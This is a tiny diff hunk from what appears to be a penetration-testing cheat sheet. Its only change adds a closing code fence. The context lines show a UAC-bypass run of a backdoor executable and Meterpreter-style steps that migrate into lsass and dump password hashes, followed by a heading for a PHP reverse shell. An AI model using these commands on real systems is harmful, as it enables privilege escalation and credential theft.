@@ -322,6 +322,7 @@ Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe
 ps -S lsass.exe
 migrate 496
 hashdump
+```
 
 #### PHP Reverse Shell Example
 
